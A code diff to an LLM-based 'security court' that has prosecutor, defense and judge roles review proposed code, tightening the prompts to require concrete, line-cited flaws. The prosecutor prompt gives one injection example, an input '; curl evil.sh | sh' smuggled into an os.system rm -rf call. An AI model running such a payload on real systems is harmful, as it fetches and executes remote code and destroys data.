@@ -21,7 +21,7 @@ from tools.infrastructure.topology_manager import log_swarm_event
 
 # Bump whenever court prompts change. Part of the cache key, so verdicts issued
 # under old prompts or a different model are never replayed as fresh.
-COURT_PROMPT_VERSION = "2026-07-01.1"
+COURT_PROMPT_VERSION = "2026-07-04.2"
 
 class AdversarialCourt:
     def __init__(self):
@@ -42,9 +42,12 @@ class AdversarialCourt:
         conn.execute("PRAGMA busy_timeout=5000;")
         return conn
 
+    def _court_model(self) -> str:
+        return settings.COURT_LLM_MODEL or settings.PRIMARY_LLM_MODEL
+
     def _cache_key(self, proposal: str, code_snippet: str) -> str:
         combined = (
-            f"MODEL:{settings.PRIMARY_LLM_MODEL}\n"
+            f"MODEL:{self._court_model()}\n"
             f"PROMPTS:{COURT_PROMPT_VERSION}\n"
             f"PROPOSAL:{proposal}\nCODE:{code_snippet}"
         )
@@ -122,7 +125,7 @@ class AdversarialCourt:
         """Helper to route and execute a chat request to the primary LLM provider."""
         primary_url = settings.PRIMARY_LLM_URL or "http://localhost:11434/v1"
         url = primary_url.rstrip('/')
-        model = settings.PRIMARY_LLM_MODEL
+        model = self._court_model()
 
         # Handle direct Ollama chat endpoint if applicable
         if "11434" in url or "ollama" in url:
@@ -134,11 +137,16 @@ class AdversarialCourt:
                     {"role": "user", "content": user_prompt}
                 ],
                 "stream": False,
+                # Briefs run fast without thinking; the judge — the only role
+                # whose output is binding — gets the model's full reasoning.
+                # Ollama returns thinking separately, so content stays clean.
+                "think": role == "judge",
                 "options": {"temperature": 0.2 if role != "prosecutor" else 0.4}
             }
-            
+
             try:
-                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=45)) as session:
+                call_budget = 240 if role == "judge" else 90
+                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=call_budget)) as session:
                     async with session.post(chat_url, json=payload) as response:
                         if response.status == 200:
                             data = await response.json()
@@ -214,7 +222,14 @@ class AdversarialCourt:
         prosecutor_system = (
             "You are the Prosecuting Security Auditor. Your objective is to find hidden security flaws, traversal exploits, "
             "remote execution injection holes, syntax errors, or logical bugs in the proposed code snippet. "
-            "Provide a critical, highly suspicious indictment outlining the exact line numbers and risks."
+            "Every claim must cite the exact line of the shown code and give a specific malicious input or state that "
+            "triggers the flaw. CONCRETE flaws include: untrusted input concatenated or interpolated into shell commands "
+            "(os.system, subprocess with shell=True), SQL strings, eval/exec, or file paths; secrets written to logs; "
+            "missing auth on privileged operations; logic errors with a reproducible wrong result. Example: "
+            "os.system('rm -rf ' + user_path) is CONCRETE — input '; curl evil.sh | sh' executes arbitrary commands. "
+            "SPECULATIVE claims (\"could be manipulated\", \"lacks validation\", \"potential injection\") that do not trace "
+            "an input through THIS code are inadmissible — do not invent them. If and only if no concrete flaw exists, "
+            "state exactly: 'NO CONCRETE FLAWS FOUND.'"
         )
         prosecutor_user = f"Review the following untrusted input carefully:\n\n<user_proposal>\n{proposal}\n</user_proposal>\n\n<code_snippet>\n{code_snippet}\n</code_snippet>"
 
@@ -240,6 +255,12 @@ class AdversarialCourt:
             "You are the presiding Judge of the Kenbun security court. You have been presented with a code snippet, "
             "a Defendant Counsel's argument for its safety, and a Prosecuting Auditor's indictment of security risks. "
             "Critically review both arguments. Weigh the evidence and issue a final, binding Verdict. "
+            "Adjudication standard — the burden of proof is on the prosecution: REJECT only if the indictment identifies "
+            "a CONCRETE flaw in the shown code — a specific line plus a specific input or state that demonstrably causes "
+            "insecure or incorrect behavior. Generic claims (\"could be manipulated\", \"lacks input validation\", "
+            "\"potential injection\") that do not trace through the actual code are speculation and must be dismissed. "
+            "The absence of additional hardening is not a flaw unless the shown code itself introduces a vulnerability. "
+            "If the prosecution's case is speculative, APPROVE — even if the defense brief is weak. "
             "You must return ONLY a JSON block containing: \n"
             "{\n"
             "  \"verdict\": \"APPROVED\" or \"REJECTED\",\n"
